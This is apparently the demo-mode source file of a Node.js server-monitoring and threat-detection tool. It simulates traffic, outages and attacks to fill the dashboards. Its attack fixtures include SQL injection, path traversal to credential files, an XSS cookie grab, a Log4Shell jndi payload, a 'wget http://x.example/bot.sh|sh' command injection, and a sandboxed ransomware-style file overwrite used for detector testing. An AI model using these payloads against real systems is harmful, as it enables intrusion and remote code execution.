// DEMO mode: a fake API to monitor, simulated traffic + attacks, two simulated remote servers, and
// 24h of back-filled history so every screen has something to show. Enable with DEMO=true.
const fs = require('fs');
const path = require('path');
const config = require('./config');
const store = require('./store');
const { state, pushBounded, uid, LIMITS } = store;
const auth = require('./auth');

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const rnd = (a, b) => a + Math.random() * (b - a);
const pick = (arr) => arr[Math.floor(Math.random() * arr.length)];

const GOOD_IPS = Array.from({ length: 60 }, (_, i) => `49.36.${(i * 7) % 255}.${(i * 13) % 250 + 2}`);
const BAD = {
  sqli: '185.220.101.47', scanner: '45.155.205.233', brute: '103.152.18.9', traversal: '92.63.197.153',
  probe: '193.142.146.226', ssh: '218.92.0.112', flood: '5.188.62.214',
};
const NORMAL_ROUTES = ['/api/users', '/api/orders', '/api/orders/1842', '/api/products?page=2', '/api/cart', '/api/auth/login', '/', '/static/app.js', '/api/payments/status', '/api/search?q=shoes'];
const ATTACKS = {
  sqli: () => ({ ip: BAD.sqli, method: 'GET', path: pick(["/api/products?id=1' OR '1'='1", '/api/users?id=1 UNION SELECT username,password FROM users--', '/api/search?q=1;DROP TABLE orders', '/api/orders?id=1 AND SLEEP(5)']), status: pick([400, 500, 200]), ua: 'Mozilla/5.0' }),
  scanner: () => ({ ip: BAD.scanner, method: 'GET', path: pick(['/admin', '/backup.zip', '/.git/config', '/phpmyadmin/', '/wp-login.php', '/config.php.bak']), status: 404, ua: pick(['Mozilla/5.00 (Nikto/2.5.0)', 'sqlmap/1.7.2#stable', 'Nuclei - Open-source project']) }),
  brute: () => ({ ip: BAD.brute, method: 'POST', path: '/api/auth/login', status: 401, ua: 'python-requests/2.31' }),
  traversal: () => ({ ip: BAD.traversal, method: 'GET', path: pick(['/static/../../../../etc/passwd', '/download?file=..%2F..%2F..%2Fetc%2Fshadow', '/api/files?path=....//....//windows/win.ini']), status: 400, ua: 'curl/8.1' }),
  probe: () => ({ ip: BAD.probe, method: 'GET', path: pick(['/.env', '/.env.production', '/.aws/credentials', '/server-status', '/actuator/env', '/docker-compose.yml']), status: 404, ua: 'Mozilla/5.0 zgrab/0.x' }),
  xss: () => ({ ip: '141.98.11.60', method: 'GET', path: '/api/search?q=<script>alert(document.cookie)</script>', status: 200, ua: 'Mozilla/5.0' }),
  log4j: () => ({ ip: '162.247.74.27', method: 'GET', path: '/api/products?x=${jndi:ldap://evil.example/a}', status: 400, ua: '${jndi:ldap://evil.example/ua}' }),
  cmd: () => ({ ip: '80.94.95.81', method: 'GET', path: '/cgi-bin/status?cmd=;wget http://x.example/bot.sh|sh', status: 404, ua: 'Hello, World' }),
};

function install(app, { metrics, threats, checker, reports }) {
  console.log('[demo] DEMO MODE ON — simulated API, traffic, attacks and servers');

  // ---------------- fake API being monitored ----------------
  const flaky = { orders: 0.12, payments: 0.15, search: 0.06 };
  app.get('/demo-api/health', (req, res) => res.json({ status: 'ok', uptime: process.uptime() }));
  app.get('/demo-api/users', async (req, res) => { await sleep(Math.random() < 0.1 ? rnd(2100, 2900) : rnd(60, 220)); res.json({ users: [{ id: 1, name: 'Asha' }, { id: 2, name: 'Vikram' }], total: 2 }); });
  app.post('/demo-api/auth/login', async (req, res) => { await sleep(rnd(80, 180)); res.json({ token: 'demo.jwt.token', expiresIn: 3600 }); });
  app.get('/demo-api/orders', async (req, res) => {
    await sleep(rnd(90, 300));
    if (Math.random() < flaky.orders) return res.status(pick([500, 503])).json({ error: 'database connection pool exhausted' });
    res.json({ orders: [{ id: 1842, total: 1299 }], status: 'ok' });
  });
  app.get('/demo-api/payments/status', async (req, res) => { await sleep(rnd(120, 400)); res.json({ status: Math.random() < flaky.payments ? 'degraded' : 'ok', gateway: 'razorpay' }); });
  app.get('/demo-api/search', async (req, res) => { if (Math.random() < flaky.search) await sleep(12_000); else await sleep(rnd(150, 900)); res.json({ results: [] }); });
  app.get('/demo-api/v1/reports', (req, res) => res.status(404).json({ error: 'Not Found' }));

  // ---------------- fake Redis on :6399 that goes down 3 min out of every 20 ----------------
  const net = require('net');
  let redis = null;
  const redisUp = () => { if (redis) return; redis = net.createServer((sock) => { sock.on('error', () => {}); sock.end('+PONG\r\n'); }).listen(6399, '127.0.0.1'); redis.on('error', () => { redis = null; }); };
  const redisDown = () => { if (redis) { redis.close(); redis = null; } };
  redisUp();
  setInterval(() => { const m = new Date().getMinutes() % 20; if (m >= 7 && m < 10) redisDown(); else redisUp(); }, 15_000);

  // ---------------- seed routes once ----------------
  const base = `http://127.0.0.1:${config.PORT}/demo-api`;
  if (!state.routes.length) {
    const seed = [
      { name: 'Health endpoint', url: `${base}/health`, expectStatus: '200', expectJsonPath: 'status', expectJsonValue: 'ok', maxLatencyMs: 500, intervalSec: 20, group: 'Core' },
      { name: 'Users API', url: `${base}/users`, expectStatus: '200', expectContains: '"users"', maxLatencyMs: 1500, intervalSec: 30, group: 'Core' },
      { name: 'Login', method: 'POST', url: `${base}/auth/login`, body: '{"email":"monitor@example.com","password":"••••"}', expectStatus: '200', expectJsonPath: 'token', maxLatencyMs: 800, intervalSec: 30, group: 'Auth' },
      { name: 'Orders API', url: `${base}/orders`, expectStatus: '200', expectJsonPath: 'status', expectJsonValue: 'ok', maxLatencyMs: 1000, intervalSec: 20, group: 'Commerce' },
      { name: 'Payment gateway status', url: `${base}/payments/status`, expectStatus: '200', expectJsonPath: 'status', expectJsonValue: 'ok', maxLatencyMs: 1000, intervalSec: 30, group: 'Commerce' },
      { name: 'Search', url: `${base}/search?q=test`, expectStatus: '200', maxLatencyMs: 1200, timeoutMs: 5000, intervalSec: 30, group: 'Commerce' },
      { name: 'Legacy reports v1', url: `${base}/v1/reports`, expectStatus: '200', maxLatencyMs: 1000, intervalSec: 60, group: 'Legacy' },
      { name: 'Redis cache', type: 'tcp', host: '127.0.0.1', port: 6399, intervalSec: 30, group: 'Infra' },
      { name: 'Hub port', type: 'tcp', host: '127.0.0.1', port: config.PORT, intervalSec: 60, group: 'Infra' },
    ];
    for (const s of seed) state.routes.push(checker.normalizeRoute(s));
    backfill(reports);
    store.save();
  }

  // ---------------- simulated remote servers ----------------
  const remotes = [
    { id: 'payments-api', name: 'payments-api-01', base: 46, amp: 22, mem: 63, disk: 58, info: { hostname: 'payments-api-01', platform: 'Linux 6.8 (Ubuntu 24.04)', cores: 4, cpuModel: 'AMD EPYC 7R13', memTotal: 8 * 2 ** 30 } },
    { id: 'db-replica', name: 'db-replica-02', base: 28, amp: 10, mem: 87.5, disk: 83.4, info: { hostname: 'db-replica-02', platform: 'Linux 6.8 (Ubuntu 24.04)', cores: 8, cpuModel: 'Intel Xeon Platinum 8375C', memTotal: 32 * 2 ** 30 } },
  ];
  let phase = 0;
  setInterval(() => {
    phase += 0.04;
    for (const r of remotes) {
      const spike = Math.random() < 0.03 ? rnd(20, 35) : 0;
      const cpu = Math.min(99, Math.max(2, r.base + Math.sin(phase + r.amp) * r.amp + rnd(-5, 5) + spike));
      const mem = Math.min(99, r.mem + Math.sin(phase / 3) * 2 + rnd(-0.6, 0.6));
      metrics.processSample(r.id, synthSample(cpu, mem, r.disk, r.info), { name: r.name, info: r.info });
    }
  }, 5000);

  // ---------------- simulated traffic + attacks ----------------
  setInterval(() => {
    const n = Math.round(rnd(6, 18));
    for (let i = 0; i < n; i++) {
      const p = pick(NORMAL_ROUTES);
      const status = Math.random() < 0.02 ? 500 : Math.random() < 0.04 ? 404 : p.includes('login') && Math.random() < 0.15 ? 401 : 200;
      threats.processRequest(pick(['main', 'payments-api']).replace('main', config.SERVER_ID), { ip: pick(GOOD_IPS), method: p.includes('login') ? 'POST' : 'GET', path: p, status, ua: 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X)' });
    }
  }, 1000);

  const schedule = [
    ['sqli', 20_000, 6], ['scanner', 45_000, 50], ['brute', 70_000, 25], ['probe', 100_000, 8], ['traversal', 130_000, 5], ['xss', 160_000, 2], ['log4j', 200_000, 1],
  ];
  for (const [kind, delay, count] of schedule) setTimeout(() => burst(kind, count, threats), delay);
  setInterval(() => burst(pick(Object.keys(ATTACKS)), Math.round(rnd(3, 30)), threats), 4 * 60_000);
  setTimeout(() => sshBurst(threats, 12), 55_000);

  // ---------------- on-demand simulations (Settings → Demo) ----------------
  app.post('/api/demo/simulate', auth.requireAuth, async (req, res) => {
    const kind = req.body?.kind;
    if (ATTACKS[kind]) burst(kind, kind === 'brute' ? 30 : 12, threats);
    else if (kind === 'ssh') sshBurst(threats, 20);
    else if (kind === 'flood') { for (let i = 0; i < 700; i++) threats.processRequest(config.SERVER_ID, { ip: BAD.flood, method: 'GET', path: '/api/products', status: 200, ua: 'Go-http-client/1.1' }); }
    else if (kind === 'ransomware') await ransomware(threats);
    else if (kind === 'cpu') { const r = remotes[0]; r.base = 93; setTimeout(() => (r.base = 46), 90_000); }
    else if (kind === 'outage') { flaky.orders = 1; setTimeout(() => (flaky.orders = 0.12), 120_000); }
    else return res.status(400).json({ error: 'unknown simulation' });
    res.json({ ok: true, kind });
  });
}

function burst(kind, count, threats) {
  for (let i = 0; i < count; i++) threats.processRequest(config.SERVER_ID, ATTACKS[kind]());
}
function sshBurst(threats, n) {
  for (let i = 0; i < n; i++) threats.processAuth(config.SERVER_ID, { kind: 'fail', user: pick(['root', 'admin', 'ubuntu', 'oracle']), ip: BAD.ssh });
}

// Exercises the real ransomware watcher on a sandbox folder inside data/
async function ransomware(threats) {
  const dir = path.join(config.DATA_DIR, 'demo-protected');
  fs.mkdirSync(dir, { recursive: true });
  if (!install._watching) {
    const { startRansomwareWatch } = require('./collectors/fswatch');
    startRansomwareWatch({ dirs: [dir], getSettings: () => state.settings, emit: (ev) => threats.processFileEvent(config.SERVER_ID, ev) });
    install._watching = true;
    await sleep(500);
  }
  for (let i = 0; i < 30; i++) fs.writeFileSync(path.join(dir, `invoice-${i}.csv`), 'id,amount\n1,100\n'.repeat(80));
  await sleep(300);
  const crypto = require('crypto');
  for (let i = 0; i < 30; i++) {
    const f = path.join(dir, `invoice-${i}.csv`);
    fs.writeFileSync(f, crypto.randomBytes(2048));
    fs.renameSync(f, f + '.lockbit');
  }
  fs.writeFileSync(path.join(dir, 'RESTORE-MY-FILES.txt'), 'Your files are encrypted. (demo)');
  fs.writeFileSync(path.join(dir, '!000-sentinel-canary.txt'), crypto.randomBytes(1024));
  setTimeout(() => { for (const f of fs.readdirSync(dir)) if (!f.includes('canary')) fs.rmSync(path.join(dir, f), { force: true }); }, 10_000);
}

function synthSample(cpu, mem, disk, info) {
  const total = info.memTotal;
  return {
    t: Date.now(), cpu: +cpu.toFixed(1), cores: info.cores, load: [+(cpu / 100 * info.cores * 0.9).toFixed(2), +(cpu / 100 * info.cores * 0.8).toFixed(2), +(cpu / 100 * info.cores * 0.7).toFixed(2)],
    mem: { total, used: Math.round(total * mem / 100), pct: +mem.toFixed(1) },
    disks: [{ path: '/', total: 200 * 2 ** 30, used: Math.round(200 * 2 ** 30 * disk / 100), free: Math.round(200 * 2 ** 30 * (1 - disk / 100)), pct: disk }],
    disk, rx: Math.round(rnd(2e5, 2e6)), tx: Math.round(rnd(1e5, 9e5)), conns: Math.round(rnd(40, 260)), procCount: Math.round(rnd(180, 240)),
    top: [{ pid: 1201, name: info.hostname.startsWith('db') ? 'postgres' : 'node', cpu: +(cpu * 0.6).toFixed(1), mem: +(mem * 0.4).toFixed(1) }, { pid: 988, name: 'nginx', cpu: +(cpu * 0.1).toFixed(1), mem: 1.2 }, { pid: 77, name: 'redis-server', cpu: 1.3, mem: 2.1 }],
    uptime: 86400 * 12,
  };
}

// ---------------- 24h history so charts are populated on first launch ----------------
function backfill(reports) {
  const now = Date.now();
  const MIN = 60_000, HOUR = 3600_000;
  const servers = [
    { id: config.SERVER_ID, name: config.SERVER_NAME, base: 22, amp: 12, mem: 54, disk: 41 },
    { id: 'payments-api', name: 'payments-api-01', base: 46, amp: 22, mem: 63, disk: 58 },
    { id: 'db-replica', name: 'db-replica-02', base: 28, amp: 10, mem: 86, disk: 83 },
  ];
  for (const sv of servers) {
    const s = state.servers[sv.id] || (state.servers[sv.id] = { id: sv.id, name: sv.name, info: {}, firstSeen: now - 86400_000, lastSeen: now, online: true, series: [], minutes: [], hours: [] });
    s.minutes = []; s.hours = [];
    for (let t = Math.floor((now - 24 * HOUR) / MIN) * MIN; t < now - MIN; t += MIN) {
      const hourOfDay = new Date(t).getHours();
      const dayCurve = Math.sin(((hourOfDay - 6) / 24) * Math.PI * 2) * 0.5 + 0.5; // busier in afternoon IST
      const cpu = Math.max(3, Math.min(98, sv.base * 0.6 + dayCurve * sv.amp * 1.6 + rnd(-4, 4) + (Math.random() < 0.01 ? rnd(25, 40) : 0)));
      const mem = Math.min(97, sv.mem + dayCurve * 4 + rnd(-1, 1));
      s.minutes.push({ t, cpu: +cpu.toFixed(1), cpuMax: +Math.min(100, cpu + rnd(3, 15)).toFixed(1), mem: +mem.toFixed(1), memMax: +(mem + rnd(0, 2)).toFixed(1), disk: sv.disk, load: +(cpu / 25).toFixed(2), rx: Math.round(rnd(2e5, 1.5e6) * (0.5 + dayCurve)), tx: Math.round(rnd(1e5, 8e5)), conns: Math.round(60 + dayCurve * 200) });
    }
    if (s.minutes.length > LIMITS.minuteSamples) s.minutes = s.minutes.slice(-LIMITS.minuteSamples);
    for (let h = config.hourStart(now - 24 * HOUR); h < config.hourStart(now); h += HOUR) {
      const pts = s.minutes.filter((m) => m.t >= h && m.t < h + HOUR);
      if (!pts.length) continue;
      const avg = (k) => +(pts.reduce((a, x) => a + x[k], 0) / pts.length).toFixed(1);
      s.hours.push({ t: h, cpu: avg('cpu'), cpuMax: Math.max(...pts.map((x) => x.cpuMax)), mem: avg('mem'), memMax: Math.max(...pts.map((x) => x.memMax)), disk: sv.disk, load: avg('load'), rx: avg('rx'), tx: avg('tx'), conns: Math.max(...pts.map((x) => x.conns)) });
    }
  }
  for (const sid of [config.SERVER_ID, 'payments-api']) {
    const arr = (state.traffic[sid] = []);
    for (let t = Math.floor((now - 24 * HOUR) / MIN) * MIN; t < now - MIN; t += MIN) {
      const hourOfDay = new Date(t).getHours();
      const dayCurve = Math.sin(((hourOfDay - 6) / 24) * Math.PI * 2) * 0.5 + 0.5;
      const req = Math.round((sid === 'payments-api' ? 140 : 420) * (0.35 + dayCurve) * rnd(0.85, 1.15));
      arr.push({ t, req, s2: Math.round(req * 0.93), s3: Math.round(req * 0.02), s4: Math.round(req * 0.04), s5: Math.round(req * rnd(0.002, 0.012)), ips: Math.round(req / 6) });
    }
  }
  // route check history
  const behaviour = { 'Orders API': 0.04, 'Payment gateway status': 0.06, Search: 0.03, 'Users API': 0.01, 'Legacy reports v1': 1, 'Redis cache': 0.01 };
  const reportHours = {};
  for (const r of state.routes) {
    const arr = (state.checks[r.id] = []);
    const step = r.intervalSec * 1000 * 2;
    const failP = behaviour[r.name] ?? 0;
    for (let t = now - Math.min(LIMITS.checksPerRoute * step, 24 * HOUR); t < now - step; t += step) {
      const hourOfDay = new Date(t).getHours();
      const outage = (r.name === 'Orders API' && hourOfDay === (new Date(now).getHours() + 18) % 24) // one bad hour earlier today
        || (r.name === 'Redis cache' && hourOfDay === (new Date(now).getHours() + 21) % 24 && new Date(t).getMinutes() < 25);
      const fail = Math.random() < (outage ? 0.75 : failP);
      let rec;
      if (r.type === 'tcp') rec = fail ? { t, r: 'down', ms: 1, c: null, i: 'CONNECTION_REFUSED', d: 'ECONNREFUSED' } : { t, r: 'ok', ms: Math.round(rnd(1, 4)), c: null, i: null, d: '' };
      else if (fail) {
        const issue = r.name === 'Legacy reports v1' ? ['mismatch', 'NOT_FOUND', 404, 'Expected 200, got 404'] : r.name === 'Payment gateway status' ? ['mismatch', 'BODY_MISMATCH', 200, 'status = "degraded" (expected "ok")'] : r.name === 'Search' ? ['down', 'TIMEOUT', null, 'TimeoutError'] : ['down', 'HTTP_502_504', 503, 'Expected 200, got 503'];
        rec = { t, r: issue[0], ms: issue[1] === 'TIMEOUT' ? r.timeoutMs : Math.round(rnd(90, 400)), c: issue[2], i: issue[1], d: issue[3] };
      } else {
        const ms = Math.round(r.name === 'Users API' && Math.random() < 0.08 ? rnd(1600, 2800) : rnd(70, 450));
        rec = ms > r.maxLatencyMs ? { t, r: 'degraded', ms, c: 200, i: 'SLOW_RESPONSE', d: `${ms} ms > limit ${r.maxLatencyMs} ms` } : { t, r: 'ok', ms, c: 200, i: null, d: '' };
      }
      arr.push(rec);
      const hk = config.hourStart(t);
      const h = (reportHours[hk] = reportHours[hk] || { start: hk, routes: {}, threats: {}, threatIPs: {}, alerts: { total: 0, critical: 0, high: 0, warning: 0 }, alertIds: [] });
      const ra = (h.routes[r.id] = h.routes[r.id] || { checks: 0, ok: 0, degraded: 0, fail: 0, msSum: 0, msN: 0, msMax: 0, issues: {} });
      ra.checks++; if (rec.r === 'ok') ra.ok++; else if (rec.r === 'degraded') ra.degraded++; else ra.fail++;
      ra.msSum += rec.ms || 0; ra.msN++; ra.msMax = Math.max(ra.msMax, rec.ms || 0);
      if (rec.i) ra.issues[rec.i] = (ra.issues[rec.i] || 0) + 1;
    }
  }
  // past threats
  const kinds = Object.keys(ATTACKS);
  const { TYPES } = require('./threats');
  const typeOf = { sqli: 'SQL_INJECTION', scanner: 'SCANNER', brute: 'BRUTE_FORCE', traversal: 'PATH_TRAVERSAL', probe: 'SENSITIVE_PROBE', xss: 'XSS', log4j: 'LOG4SHELL', cmd: 'CMD_INJECTION' };
  for (let i = 0; i < 34; i++) {
    const t = now - rnd(20 * MIN, 23.5 * HOUR);
    const kind = pick(kinds);
    const req = ATTACKS[kind]();
    const type = typeOf[kind];
    const count = Math.round(rnd(1, kind === 'brute' || kind === 'scanner' ? 140 : 18));
    const ip = req.ip.replace(/\.\d+$/, '.' + Math.round(rnd(2, 250)));
    pushBounded(state.threats, { id: uid('th_'), t, lastT: t + rnd(0, 10 * MIN), serverId: Math.random() < 0.7 ? config.SERVER_ID : 'payments-api', type, label: TYPES[type].label, category: TYPES[type].cat, severity: count > 60 ? 'high' : TYPES[type].sev, ip, route: req.path.split('?')[0], method: req.method, status: req.status, ua: req.ua, sample: `${req.method} ${req.path}`, count, routes: [req.path.split('?')[0]], paths: [], desc: '', action: require('./threats').suggestion(type, ip) }, LIMITS.threats);
    const s = (state.ipStats[ip] = state.ipStats[ip] || { req: 0, threats: 0, types: {}, first: t, last: t });
    s.threats += count; s.req += count + Math.round(rnd(0, 40)); s.types[type] = (s.types[type] || 0) + count; s.last = Math.max(s.last, t);
    const hk = config.hourStart(t);
    if (reportHours[hk]) { reportHours[hk].threats[type] = (reportHours[hk].threats[type] || 0) + count; reportHours[hk].threatIPs[ip] = (reportHours[hk].threatIPs[ip] || 0) + count; }
  }
  state.threats.sort((a, b) => a.t - b.t);
  // past hourly reports (last 12 hours)
  const curHour = config.hourStart(now);
  for (const hk of Object.keys(reportHours).map(Number).sort().filter((h) => h < curHour).slice(-12)) {
    const rep = reports.build(reportHours[hk], hk + HOUR, false);
    rep.generatedAt = hk + HOUR + 2000;
    pushBounded(state.reports, rep, LIMITS.reports);
  }
}

module.exports = { install };
